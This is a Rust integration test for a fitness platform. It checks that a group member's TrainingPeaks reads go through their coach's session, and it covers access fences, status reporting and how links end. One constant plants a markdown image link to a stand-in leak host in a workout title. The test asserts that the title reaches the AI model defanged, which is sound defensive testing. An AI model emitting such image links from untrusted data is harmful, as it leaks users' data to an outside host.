// ABOUTME: A linked member's TrainingPeaks reads go through their group coach's session, end to end over REST, tools and the sweep
// ABOUTME: Pins the athlete id and coach session on the wire, the detail fence, the status surfaces, and how each refusal ends or flags the link
//
// SPDX-License-Identifier: MIT OR Apache-2.0
// Copyright (c) 2026 dravr.ai

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
#![allow(missing_docs)]

//! A TrainingPeaks coach account has no calendar of its own; its session
//! reads each athlete on its roster by that athlete's id. A group's coach
//! proposes which roster athlete is which member, over REST, and the member
//! confirms. From then on the member's `get_activities` and
//! `get_planned_workouts` read through the coach's stored session with the
//! member's athlete id on the wire, write through under the member's own
//! keys, and report the coach on the status surfaces.
//!
//! The refusals are the other half of the contract:
//!
//! - a detail id outside the member's calendar is refused before any call;
//! - the coach's own read is refused as a coach account's, before any call;
//! - a dead coach session flags the coach, never the member, and the nightly
//!   sweep records the member's attempt as transient;
//! - an athlete TrainingPeaks drops from the coach's roster ends the link;
//! - a link whose member left without the eager end, or whose coach holds no
//!   session any more, ends on the member's next read.
//!
//! One test, because `DRAVR_SCIOTTE_REMOTE_URL` is process-wide. The scraper
//! is a loopback stand-in (a test double, per the repo's mock rule) that
//! answers by the session and athlete each request names and records every
//! request, so the test reads what the platform put on the wire.

mod common;
mod helpers;

use std::collections::HashMap;
use std::env;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use axum::extract::{Path, Query, State};
use axum::http::{HeaderMap, StatusCode};
use axum::routing::{get, post};
use axum::{Json, Router};
use chrono::{Days, Duration as ChronoDuration, Utc};
use common::{create_test_server_resources, create_test_user_with_plan, generate_test_token};
use dravr_tronc::mcp::schema::ToolResponse;
use dravr_tronc::mcp::tool::{McpTool, ToolContext};
use helpers::axum_test::AxumTestRequest;
use pierre_core::constants::oauth::providers::TRAININGPEAKS_TERMS_VERSION;
use pierre_core::constants::oauth_providers::{SCIOTTE_TRAININGPEAKS, TOKEN_TYPE_SESSION};
use pierre_core::errors::AppResult;
use pierre_core::models::groups::{
    CoachingGroup, GroupDigestMode, GroupMember, GroupRespondMode, GroupRole,
};
use pierre_core::models::{
    AgentCategory, ConnectionStatus, ConnectionType, CreateAgentRequest, DelegatedConnection,
    DelegationEndReason, DelegationStatus, ProviderAccountRole, TenantId, UserOAuthToken,
};
use pierre_core::untrusted::{display_line, ACTIVITY_NAME_MAX_CHARS};
use pierre_mcp_server::mcp::resources::ServerContext;
use pierre_providers::core::ActivityQueryParams;
use pierre_providers::sciotte_provider::is_delegated_session_expired;
use pierre_providers::sciotte_remote::{
    sciotte_refusal, ATHLETE_NOT_ACCESSIBLE, ENV_AUDIENCE, ENV_REMOTE_URL,
};
use pierre_providers::CoreFitnessProvider;
use pierre_routes_auth::AuthRoutes;
use pierre_routes_groups::DelegatedConnectionRoutes;
use pierre_tool_runtime::activity_fetch::fetch_provider_head;
use pierre_tool_runtime::capture_sweep::{refresh_captures, RefreshOutcome, SweepBudget};
use pierre_tool_runtime::implementations::connection::GetConnectionStatusTool;
use pierre_tool_runtime::implementations::data::GetActivitiesTool;
use pierre_tool_runtime::implementations::planned_workouts::GetPlannedWorkoutsTool;
use pierre_tool_runtime::protocol::auth::AuthService;
use pierre_tool_runtime::runtime::ToolRuntime;
use serde_json::{json, Value};
use tokio::net::TcpListener;
use tokio::time::sleep;
use uuid::Uuid;

const PROVIDER: &str = SCIOTTE_TRAININGPEAKS;
/// The coach's live TrainingPeaks session.
const COACH_SESSION: &str = "tp-coach-live";
/// The coach's session once TrainingPeaks stops honouring it.
const DEAD_COACH_SESSION: &str = "tp-coach-dead";
const COACH_NAME: &str = "Casey Coach";

/// The member the reads are pinned on, and their athlete id on the roster.
const M1_ATHLETE: &str = "900001";
/// The member TrainingPeaks drops from the coach's roster.
const M2_ATHLETE: &str = "900002";
/// The member whose coach ends up holding no session.
const M3_ATHLETE: &str = "900003";

/// The one workout on the linked member's calendar.
const M1_WORKOUT: &str = "900001:5001";
/// A workout on another athlete's calendar, which the member's link must
/// never reach.
const OTHER_ATHLETES_WORKOUT: &str = "900002:1";

/// The workout's title, as the coach wrote it: a heading, a second line and
/// an image a client would fetch.
const INJECTED_NAME: &str = "## Threshold 2x20\n![x](https://evil.example/leak?q=)";

/// How long a spawned step (the warm-up after a confirm) gets to land.
const SPAWN_DEADLINE: Duration = Duration::from_secs(15);

/// One request the stand-in received.
#[derive(Debug, Clone)]
struct Hit {
    path: String,
    session: String,
    athlete: Option<String>,
}

/// The stand-in's record and its one switch.
#[derive(Clone, Default)]
struct Scraper {
    hits: Arc<Mutex<Vec<Hit>>>,
    /// TrainingPeaks no longer lists the second athlete on the roster.
    drop_second: Arc<AtomicBool>,
}

impl Scraper {
    fn record(&self, path: &str, headers: &HeaderMap, athlete: Option<&String>) -> String {
        let session = headers
            .get("x-session-id")
            .and_then(|v| v.to_str().ok())
            .unwrap_or_default()
            .to_owned();
        self.hits.lock().unwrap().push(Hit {
            path: path.to_owned(),
            session: session.clone(),
            athlete: athlete.cloned(),
        });
        session
    }

    fn hits(&self) -> Vec<Hit> {
        self.hits.lock().unwrap().clone()
    }

    fn hits_on(&self, path: &str) -> Vec<Hit> {
        self.hits().into_iter().filter(|h| h.path == path).collect()
    }

    fn clear(&self) {
        self.hits.lock().unwrap().clear();
    }
}

fn session_json(session_id: &str) -> Value {
    json!({
        "session_id": session_id,
        "cookies": [],
        "created_at": "2026-09-23T12:00:00Z",
        "expires_at": null
    })
}

fn dead() -> (StatusCode, Json<Value>) {
    (
        StatusCode::UNAUTHORIZED,
        Json(json!({ "error": "session_expired" })),
    )
}

fn workout_row(id: &str) -> Value {
    json!({
        "id": id,
        "name": INJECTED_NAME,
        "sport_type": "ride",
        "start_date": (Utc::now() - ChronoDuration::days(2)).to_rfc3339(),
        "duration_seconds": 5_400,
        "provider": "trainingpeaks",
    })
}

async fn athlete_route(State(s): State<Scraper>, headers: HeaderMap) -> (StatusCode, Json<Value>) {
    if s.record("/api/athlete", &headers, None) != COACH_SESSION {
        return dead();
    }
    let mut roster = vec![
        json!({ "id": M1_ATHLETE, "display_name": "Alex Athlete" }),
        json!({ "id": M3_ATHLETE, "display_name": "Robin Rower" }),
    ];
    if !s.drop_second.load(Ordering::SeqCst) {
        roster.push(json!({ "id": M2_ATHLETE, "display_name": "Sam Swimmer" }));
    }
    (
        StatusCode::OK,
        Json(json!({
            "id": "900101",
            "role": "coach",
            "coached_athletes": roster,
            "display_name": COACH_NAME,
        })),
    )
}

async fn activities_route(
    State(s): State<Scraper>,
    headers: HeaderMap,
    Query(query): Query<HashMap<String, String>>,
) -> (StatusCode, Json<Value>) {
    let athlete = query.get("athlete");
    if s.record("/api/activities", &headers, athlete) != COACH_SESSION {
        return dead();
    }
    let list = |rows: Vec<Value>| {
        (
            StatusCode::OK,
            Json(json!({ "activities": rows, "head_complete": true })),
        )
    };
    match athlete.map(String::as_str) {
        None => (
            StatusCode::BAD_REQUEST,
            Json(json!({ "error": "athlete_required" })),
        ),
        Some(M1_ATHLETE) => list(vec![workout_row(M1_WORKOUT)]),
        Some(M2_ATHLETE) if !s.drop_second.load(Ordering::SeqCst) => list(vec![]),
        Some(M3_ATHLETE) => list(vec![]),
        Some(other) => (
            StatusCode::FORBIDDEN,
            Json(json!({ "error": ATHLETE_NOT_ACCESSIBLE, "athlete": other })),
        ),
    }
}

async fn planned_route(
    State(s): State<Scraper>,
    headers: HeaderMap,
    Query(query): Query<HashMap<String, String>>,
) -> (StatusCode, Json<Value>) {
    let athlete = query.get("athlete");
    if s.record("/api/planned-workouts", &headers, athlete) != COACH_SESSION {
        return dead();
    }
    if athlete.map(String::as_str) != Some(M1_ATHLETE) {
        return (
            StatusCode::BAD_REQUEST,
            Json(json!({ "error": "athlete_required" })),
        );
    }
    let after = query.get("after").cloned().unwrap_or_default();
    (
        StatusCode::OK,
        Json(json!({
            "count": 1,
            "planned_workouts": [{
                "id": "900001:910004",
                "date": after,
                "sport_type": "ride",
                "title": "Sweet spot 3x15",
                "planned_duration_seconds": 3600
            }]
        })),
    )
}

async fn detail_route(
    State(s): State<Scraper>,
    headers: HeaderMap,
    Path(id): Path<String>,
) -> (StatusCode, Json<Value>) {
    s.record(&format!("/api/activities/{id}"), &headers, None);
    (StatusCode::OK, Json(workout_row(&id)))
}

async fn spawn_scraper(scraper: Scraper) -> String {
    let app = Router::new()
        .route(
            "/auth/import-session",
            post(|Json(body): Json<Value>| async move {
                Json(json!({ "session_id": body["session"]["session_id"] }))
            }),
        )
        .route("/api/athlete", get(athlete_route))
        .route("/api/activities", get(activities_route))
        .route("/api/activities/{id}", get(detail_route))
        .route("/api/planned-workouts", get(planned_route))
        .with_state(scraper);
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    format!("http://{addr}")
}

/// One signed-in user.
struct Person {
    id: Uuid,
    tenant: TenantId,
    auth: String,
}

struct World {
    res: Arc<ServerContext>,
    runtime: Arc<dyn ToolRuntime>,
    router: Router,
    scraper: Scraper,
    group: Uuid,
    coach: Person,
    m1: Person,
    m2: Person,
    m3: Person,
}

async fn person(res: &Arc<ServerContext>, email: &str, name: &str) -> Person {
    let (id, user, tenant) = create_test_user_with_plan(&res.agent.database, email, "professional")
        .await
        .unwrap();
    res.common
        .repos
        .users
        .update_display_name(id, name)
        .await
        .unwrap();
    let auth = format!("Bearer {}", generate_test_token(res, &user).await);
    Person { id, tenant, auth }
}

fn session_token(user: Uuid, tenant: TenantId, session_id: &str) -> UserOAuthToken {
    let now = Utc::now();
    UserOAuthToken {
        id: Uuid::new_v4().to_string(),
        user_id: user,
        tenant_id: tenant.to_string(),
        provider: PROVIDER.to_owned(),
        access_token: session_json(session_id).to_string(),
        refresh_token: None,
        token_type: TOKEN_TYPE_SESSION.to_owned(),
        expires_at: None,
        scope: None,
        provider_user_id: None,
        oauth_app_client_id: None,
        created_at: now,
        updated_at: now,
    }
}

fn agent_request() -> CreateAgentRequest {
    CreateAgentRequest {
        title: "Group Agent".to_owned(),
        description: None,
        system_prompt: "You are helpful".to_owned(),
        category: AgentCategory::Custom,
        tags: vec![],
        sample_prompts: vec![],
        startup_query: None,
        data_requirements: None,
        purpose: None,
        when_to_use: None,
        instructions: None,
        example_inputs: None,
        example_outputs: None,
        success_criteria: None,
        max_tool_iterations: None,
    }
}

async fn world(scraper: Scraper) -> World {
    let res = create_test_server_resources().await.unwrap();
    let repos = Arc::clone(&res.common.repos);
    let owner = person(&res, "owner@delegated-read.test", "Olive Owner").await;
    let coach = person(&res, "coach@delegated-read.test", COACH_NAME).await;
    let m1 = person(&res, "m1@delegated-read.test", "Alex Athlete").await;
    let m2 = person(&res, "m2@delegated-read.test", "Sam Swimmer").await;
    let m3 = person(&res, "m3@delegated-read.test", "Robin Rower").await;

    let agent_id = repos
        .agents
        .create(owner.id, owner.tenant, &agent_request())
        .await
        .unwrap()
        .id
        .to_string();
    let now = Utc::now();
    let group = repos
        .groups
        .create_group(
            owner.tenant,
            &CoachingGroup {
                id: Uuid::new_v4(),
                tenant_id: owner.tenant.to_string(),
                name: "Squad".to_owned(),
                description: None,
                agent_id,
                owner_id: owner.id,
                coach_user_id: None,
                peer_data_sharing: false,
                respond_mode: GroupRespondMode::default(),
                digest_mode: GroupDigestMode::Off,
                max_members: 10,
                is_active: true,
                channel_type: None,
                channel_chat_id: None,
                created_at: now,
                updated_at: now,
            },
        )
        .await
        .unwrap()
        .id;
    assert!(repos
        .groups
        .set_group_coach_user(&group.to_string(), Some(coach.id), owner.tenant)
        .await
        .unwrap());
    for member in [&m1, &m2, &m3] {
        repos
            .groups
            .add_member(&GroupMember {
                id: Uuid::new_v4(),
                group_id: group,
                user_id: member.id,
                tenant_id: member.tenant.to_string(),
                role: GroupRole::Member,
                peer_sharing_consent: false,
                consent_given_at: now,
                joined_at: now,
                left_at: None,
                display_name: None,
            })
            .await
            .unwrap();
    }

    // The coach's own TrainingPeaks session, with the notice accepted.
    repos
        .oauth_tokens
        .upsert_token(&session_token(coach.id, coach.tenant, COACH_SESSION))
        .await
        .unwrap();
    repos
        .provider_connections
        .register_connection(
            coach.id,
            coach.tenant,
            PROVIDER,
            &ConnectionType::Manual,
            None,
        )
        .await
        .unwrap();
    repos
        .users
        .record_trainingpeaks_terms(coach.id, TRAININGPEAKS_TERMS_VERSION)
        .await
        .unwrap();

    let runtime: Arc<dyn ToolRuntime> = res.clone();
    let router = DelegatedConnectionRoutes::routes(Arc::clone(&res))
        .merge(AuthRoutes::routes(res.auth_routes_context()));
    World {
        res,
        runtime,
        router,
        scraper,
        group,
        coach,
        m1,
        m2,
        m3,
    }
}

fn parse(text: &str) -> Value {
    serde_json::from_str(text).unwrap_or(Value::Null)
}

fn ctx(who: &Person) -> ToolContext {
    ToolContext::new()
        .with_user(who.id.to_string())
        .with_tenant(who.tenant.to_string())
        .with_auth_method("jwt_bearer")
}

fn payload(response: &ToolResponse) -> Value {
    response
        .structured_content
        .clone()
        .unwrap_or_else(|| panic!("the tool answers with structured content: {response:?}"))
}

impl World {
    fn links_path(&self) -> String {
        format!("/api/groups/{}/delegated-connections", self.group)
    }

    async fn post(&self, path: &str, who: &Person, body: &Value) -> (StatusCode, Value) {
        let resp = AxumTestRequest::post(path)
            .header("authorization", &who.auth)
            .json(body)
            .send(self.router.clone())
            .await;
        (resp.status_code(), parse(&resp.text()))
    }

    /// The coach proposes `athlete` as `member`, the member confirms, and
    /// the warm-up read the confirm spawns lands. Returns the link id.
    async fn link(&self, athlete: &str, member: &Person) -> Uuid {
        let (status, proposed) = self
            .post(
                &self.links_path(),
                &self.coach,
                &json!({
                    "provider": "trainingpeaks",
                    "provider_athlete_id": athlete,
                    "member_user_id": member.id,
                }),
            )
            .await;
        assert_eq!(status, StatusCode::CREATED, "{proposed}");
        let id = proposed["id"].as_str().unwrap().to_owned();

        let (status, confirmed) = self
            .post(
                &format!("{}/{id}/confirm", self.links_path()),
                member,
                &json!({}),
            )
            .await;
        assert_eq!(status, StatusCode::OK, "{confirmed}");
        assert_eq!(confirmed["status"], "confirmed");

        // The confirm reads the member's recent workouts off the request,
        // through the link, under the coach's session and the member's id.
        self.wait_for("the warm-up read after the confirm", || {
            self.scraper
                .hits_on("/api/activities")
                .iter()
                .any(|h| h.session == COACH_SESSION && h.athlete.as_deref() == Some(athlete))
        })
        .await;
        Uuid::parse_str(&id).unwrap()
    }

    async fn wait_for(&self, what: &str, done: impl Fn() -> bool) {
        let deadline = Instant::now() + SPAWN_DEADLINE;
        while !done() {
            assert!(Instant::now() < deadline, "{what} never happened");
            sleep(Duration::from_millis(50)).await;
        }
    }

    /// The link as stored, read as its coach.
    async fn stored(&self, link: Uuid) -> DelegatedConnection {
        self.res
            .common
            .repos
            .delegated_connections
            .get_for_participant(link, self.group, self.coach.id)
            .await
            .unwrap()
            .expect("an ended link stays for audit")
    }

    async fn connection(&self, who: &Person) -> Option<(ConnectionType, ConnectionStatus)> {
        self.res
            .common
            .repos
            .provider_connections
            .get_for_user(who.id, Some(who.tenant))
            .await
            .unwrap()
            .into_iter()
            .find(|c| c.provider == PROVIDER)
            .map(|c| (c.connection_type, c.status))
    }

    async fn cached_ids(&self, who: &Person) -> Vec<String> {
        self.res
            .common
            .repos
            .activity_cache
            .get_cached_activities(
                who.id,
                &who.tenant,
                Some(PROVIDER),
                Utc::now() - ChronoDuration::days(30),
                Utc::now() + ChronoDuration::days(1),
                100,
            )
            .await
            .unwrap()
            .iter()
            .map(|a| a.id().to_owned())
            .collect()
    }

    /// The TrainingPeaks card `who` reads on `/api/providers`.
    async fn trainingpeaks_card(&self, who: &Person) -> Value {
        let resp = AxumTestRequest::get("/api/providers")
            .header("authorization", &who.auth)
            .send(self.router.clone())
            .await;
        let body = parse(&resp.text());
        body["providers"]
            .as_array()
            .unwrap()
            .iter()
            .find(|card| card["provider"] == PROVIDER)
            .cloned()
            .expect("the TrainingPeaks card is listed")
    }

    async fn connection_status(&self, who: &Person) -> Value {
        payload(
            &GetConnectionStatusTool
                .execute(
                    &self.runtime,
                    &ctx(who),
                    json!({ "provider": "trainingpeaks" }),
                )
                .await,
        )
    }

    /// The provider `who`'s TrainingPeaks reads are served by, or the
    /// refusal's words.
    async fn authenticate(&self, who: &Person) -> Result<Box<dyn CoreFitnessProvider>, String> {
        AuthService::new(Arc::clone(&self.runtime))
            .create_authenticated_provider("trainingpeaks", who.id, Some(&who.tenant.to_string()))
            .await
            .map_err(|response| response.error.unwrap_or_default())
    }

    async fn head(&self, who: &Person) -> AppResult<usize> {
        let params = ActivityQueryParams {
            limit: Some(10),
            offset: None,
            before: None,
            after: None,
        };
        fetch_provider_head(
            &self.runtime,
            PROVIDER,
            who.id,
            &who.tenant.to_string(),
            &params,
        )
        .await
        .map(|activities| activities.len())
    }
}

/// The member's `get_activities` reads through the coach's session with the
/// member's athlete id, writes through under the member, and the title the
/// coach wrote reaches the model as one defanged line.
async fn get_activities_reads_through_the_coach(w: &World) {
    w.scraper.clear();
    let response = GetActivitiesTool
        .execute(
            &w.runtime,
            &ctx(&w.m1),
            json!({ "provider": "trainingpeaks", "limit": 10, "mode": "summary" }),
        )
        .await;
    let body = payload(&response);
    assert!(!response.is_error, "{body}");
    let activities = body["activities"].as_array().expect("activities");
    assert_eq!(activities.len(), 1, "{body}");
    assert_eq!(activities[0]["id"], M1_WORKOUT);
    let name = activities[0]["name"].as_str().unwrap();
    assert_eq!(name, display_line(INJECTED_NAME, ACTIVITY_NAME_MAX_CHARS));
    assert_eq!(name, "Threshold 2x20 ![x] (https://evil.example/leak?q=)");

    let reads = w.scraper.hits_on("/api/activities");
    assert_eq!(reads.len(), 1, "{reads:?}");
    assert_eq!(reads[0].session, COACH_SESSION);
    assert_eq!(reads[0].athlete.as_deref(), Some(M1_ATHLETE));
    assert_eq!(w.cached_ids(&w.m1).await, vec![M1_WORKOUT.to_owned()]);
    assert!(
        w.cached_ids(&w.coach).await.is_empty(),
        "nothing is filed under the coach"
    );
}

/// The member's `get_planned_workouts` reads the member's plan through the
/// coach's session.
async fn get_planned_workouts_reads_through_the_coach(w: &World) {
    w.scraper.clear();
    let today = Utc::now().date_naive();
    let end = today.checked_add_days(Days::new(14)).unwrap();
    let response = GetPlannedWorkoutsTool
        .execute(
            &w.runtime,
            &ctx(&w.m1),
            json!({
                "start_date": today.format("%Y-%m-%d").to_string(),
                "end_date": end.format("%Y-%m-%d").to_string(),
            }),
        )
        .await;
    let body = payload(&response);
    assert!(!response.is_error, "{body}");
    let planned = body["planned_workouts"]
        .as_array()
        .expect("planned_workouts");
    assert_eq!(planned.len(), 1, "{body}");
    assert_eq!(planned[0]["title"], "Sweet spot 3x15");

    let reads = w.scraper.hits_on("/api/planned-workouts");
    assert_eq!(reads.len(), 1, "{reads:?}");
    assert_eq!(reads[0].session, COACH_SESSION);
    assert_eq!(reads[0].athlete.as_deref(), Some(M1_ATHLETE));
}

/// Both status surfaces say the member's TrainingPeaks is connected through
/// the coach.
async fn the_status_names_the_coach(w: &World) {
    let status = w.connection_status(&w.m1).await;
    assert_eq!(status["connected"], true, "{status}");
    assert_eq!(status["backend"], "delegated");
    assert_eq!(status["status"], "connected");
    assert_eq!(status["needs_reauth"], false);
    assert_eq!(status["delegated_by"], COACH_NAME);

    let card = w.trainingpeaks_card(&w.m1).await;
    assert_eq!(card["connected"], true, "{card}");
    assert_eq!(card["needs_reauth"], false);
    assert_eq!(card["delegation"]["coach_display_name"], COACH_NAME);
    assert_eq!(card["delegation"]["group_name"], "Squad");
    assert_eq!(card["delegation"]["group_id"], w.group.to_string());
    assert_eq!(card["delegation"]["status"], "confirmed");
    assert_eq!(card["delegation"]["coach_needs_reauth"], false);

    // The coach's own card reads as the coach account it is, with no link.
    let card = w.trainingpeaks_card(&w.coach).await;
    assert_eq!(card["account_role"], "coach", "{card}");
    assert!(card.get("delegation").is_none(), "{card}");
}

/// A detail id naming another athlete's calendar is refused before any
/// call leaves the platform.
async fn the_detail_fence_holds(w: &World) {
    let provider = w.authenticate(&w.m1).await.expect("the link serves");
    w.scraper.clear();
    let refused = provider
        .get_activity(OTHER_ATHLETES_WORKOUT)
        .await
        .expect_err("another athlete's workout is out of reach");
    assert!(
        refused.to_string().to_lowercase().contains("not found"),
        "{refused}"
    );
    assert!(w.scraper.hits().is_empty(), "{:?}", w.scraper.hits());

    let own = provider
        .get_activity(M1_WORKOUT)
        .await
        .expect("own workout");
    assert_eq!(own.id(), M1_WORKOUT);
    assert_eq!(
        w.scraper
            .hits_on(&format!("/api/activities/{M1_WORKOUT}"))
            .len(),
        1
    );
}

/// The coach's own read is refused as a coach account's before any scrape:
/// the roster read the proposals needed recorded the role.
async fn the_coachs_own_read_is_refused_in_words(w: &World) {
    w.scraper.clear();
    let refused = w.authenticate(&w.coach).await.err().expect("refused");
    assert!(refused.contains("coach account"), "{refused}");
    assert!(w.scraper.hits().is_empty(), "{:?}", w.scraper.hits());
}

/// A dead coach session flags the coach's connection and never the
/// member's, and the member's read fails as the coach's, not their own.
async fn a_dead_coach_session_flags_the_coach(w: &World) {
    let repos = &w.res.common.repos;
    repos
        .oauth_tokens
        .upsert_token(&session_token(
            w.coach.id,
            w.coach.tenant,
            DEAD_COACH_SESSION,
        ))
        .await
        .unwrap();

    let error = w
        .head(&w.m1)
        .await
        .expect_err("the coach's session is dead");
    assert!(is_delegated_session_expired(&error), "{error:?}");
    assert!(
        error.provider_auth_required_provider().is_none(),
        "never the member's reconnect: {error:?}"
    );
    assert!(error.to_string().contains("coach"), "{error}");
    assert_eq!(
        w.connection(&w.coach).await,
        Some((ConnectionType::Manual, ConnectionStatus::NeedsReauth))
    );
    assert_eq!(
        w.connection(&w.m1).await,
        Some((ConnectionType::Delegated, ConnectionStatus::Active))
    );
}

/// Once the coach's session is known dead, the member's next read is refused
/// before any scrape, naming the coach; both status surfaces say the coach
/// must reconnect; the sweep records the member's attempt as transient.
async fn the_member_is_told_the_coach_must_reconnect(w: &World) {
    w.scraper.clear();
    let refused = w.authenticate(&w.m1).await.err().expect("refused");
    assert!(
        refused.contains(&format!("{COACH_NAME} needs to reconnect")),
        "{refused}"
    );
    assert!(w.scraper.hits().is_empty(), "{:?}", w.scraper.hits());

    let status = w.connection_status(&w.m1).await;
    assert_eq!(status["status"], "coach_reconnect_needed", "{status}");
    assert_eq!(status["needs_reauth"], false);
    let card = w.trainingpeaks_card(&w.m1).await;
    assert_eq!(card["needs_reauth"], false, "{card}");
    assert_eq!(card["delegation"]["coach_needs_reauth"], true);

    let report = refresh_captures(&w.runtime, SweepBudget::default())
        .await
        .unwrap();
    let member = report
        .connections
        .iter()
        .find(|c| c.user_id == w.m1.id.to_string() && c.provider == PROVIDER)
        .unwrap_or_else(|| panic!("the sweep walks the member: {report:?}"));
    assert!(
        matches!(member.outcome, RefreshOutcome::Failed { .. }),
        "{:?}",
        member.outcome
    );
    assert_eq!(
        w.connection(&w.m1).await,
        Some((ConnectionType::Delegated, ConnectionStatus::Active)),
        "the sweep leaves the member's connection alone"
    );
}

/// The coach signs in again, and the member's reads resume.
async fn the_coach_signs_in_again(w: &World) {
    let repos = &w.res.common.repos;
    repos
        .oauth_tokens
        .upsert_token(&session_token(w.coach.id, w.coach.tenant, COACH_SESSION))
        .await
        .unwrap();
    repos
        .provider_connections
        .mark_active(w.coach.id, w.coach.tenant, PROVIDER)
        .await
        .unwrap();
    assert_eq!(w.head(&w.m1).await.unwrap(), 1);
}

/// TrainingPeaks drops the second athlete from the coach's roster: their
/// next read ends the link, and their delegated connection goes with it.
async fn a_roster_drop_ends_the_link(w: &World, link: Uuid) {
    w.scraper.drop_second.store(true, Ordering::SeqCst);
    let error = w
        .head(&w.m2)
        .await
        .expect_err("the athlete left the roster");
    assert_eq!(
        sciotte_refusal(&error),
        Some(ATHLETE_NOT_ACCESSIBLE),
        "{error:?}"
    );

    let ended = w.stored(link).await;
    assert_eq!(ended.status, DelegationStatus::Revoked);
    assert_eq!(ended.revoke_reason, Some(DelegationEndReason::NotOnRoster));
    assert_eq!(ended.revoked_by, None);
    assert_eq!(w.connection(&w.m2).await, None);
}

/// A member who left without the eager end of their link reads nothing: the
/// link is found through the group, so the read ends it and releases the
/// delegated connection.
async fn a_member_who_left_reads_nothing(w: &World, link: Uuid) {
    // The membership write alone, as if the lifecycle hook never ran.
    assert!(w
        .res
        .common
        .repos
        .groups
        .remove_member(&w.group.to_string(), w.m1.id)
        .await
        .unwrap());
    // The card reads the relation the read path reads: the link is no longer
    // shown before any read has ended it.
    let card = w.trainingpeaks_card(&w.m1).await;
    assert!(card.get("delegation").is_none(), "{card}");
    assert_eq!(card["connected"], false, "{card}");
    w.scraper.clear();
    let refused = w.authenticate(&w.m1).await.err().expect("refused");
    assert!(
        refused.contains("link through the athlete's coach has ended"),
        "{refused}"
    );
    assert!(w.scraper.hits().is_empty(), "{:?}", w.scraper.hits());

    let ended = w.stored(link).await;
    assert_eq!(ended.status, DelegationStatus::Revoked);
    assert_eq!(
        ended.revoke_reason,
        Some(DelegationEndReason::MemberLeft),
        "ended for what broke: the member left"
    );
    assert_eq!(ended.revoked_by, None);
    assert_eq!(w.connection(&w.m1).await, None);
    assert!(
        w.cached_ids(&w.m1).await.is_empty(),
        "the read workouts go too"
    );

    let status = w.connection_status(&w.m1).await;
    assert_eq!(status["connected"], false, "{status}");
    assert!(status.get("delegated_by").is_none(), "{status}");
}

/// A coach who holds no session any more — the row gone without the
/// disconnect hook — ends the link on the member's next read.
async fn a_coach_without_a_session_ends_the_link(w: &World, link: Uuid) {
    w.res
        .common
        .repos
        .oauth_tokens
        .delete_token(w.coach.id, w.coach.tenant, PROVIDER)
        .await
        .unwrap();
    w.scraper.clear();
    let refused = w.authenticate(&w.m3).await.err().expect("refused");
    assert!(
        refused.contains("link through the athlete's coach has ended"),
        "{refused}"
    );
    assert!(w.scraper.hits().is_empty(), "{:?}", w.scraper.hits());

    let ended = w.stored(link).await;
    assert_eq!(ended.status, DelegationStatus::Revoked);
    assert_eq!(
        ended.revoke_reason,
        Some(DelegationEndReason::CoachDisconnected)
    );
    assert_eq!(w.connection(&w.m3).await, None);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_linked_member_reads_trainingpeaks_through_the_coach() {
    let scraper = Scraper::default();
    env::set_var(ENV_REMOTE_URL, spawn_scraper(scraper.clone()).await);
    env::remove_var(ENV_AUDIENCE);
    let w = world(scraper).await;

    let m1_link = w.link(M1_ATHLETE, &w.m1).await;
    let m2_link = w.link(M2_ATHLETE, &w.m2).await;
    let m3_link = w.link(M3_ATHLETE, &w.m3).await;
    assert_eq!(
        w.connection(&w.m1).await,
        Some((ConnectionType::Delegated, ConnectionStatus::Active))
    );
    assert_eq!(
        w.res
            .common
            .repos
            .provider_connections
            .get_for_user(w.coach.id, Some(w.coach.tenant))
            .await
            .unwrap()
            .into_iter()
            .find(|c| c.provider == PROVIDER)
            .and_then(|c| c.account_role),
        Some(ProviderAccountRole::Coach)
    );
    let deadline = Instant::now() + SPAWN_DEADLINE;
    while w.cached_ids(&w.m1).await.is_empty() {
        assert!(Instant::now() < deadline, "the warm-up never wrote through");
        sleep(Duration::from_millis(50)).await;
    }

    get_activities_reads_through_the_coach(&w).await;
    get_planned_workouts_reads_through_the_coach(&w).await;
    the_status_names_the_coach(&w).await;
    the_detail_fence_holds(&w).await;
    the_coachs_own_read_is_refused_in_words(&w).await;
    a_dead_coach_session_flags_the_coach(&w).await;
    the_member_is_told_the_coach_must_reconnect(&w).await;
    the_coach_signs_in_again(&w).await;
    a_roster_drop_ends_the_link(&w, m2_link).await;
    a_member_who_left_reads_nothing(&w, m1_link).await;
    a_coach_without_a_session_ends_the_link(&w, m3_link).await;

    env::remove_var(ENV_REMOTE_URL);
}
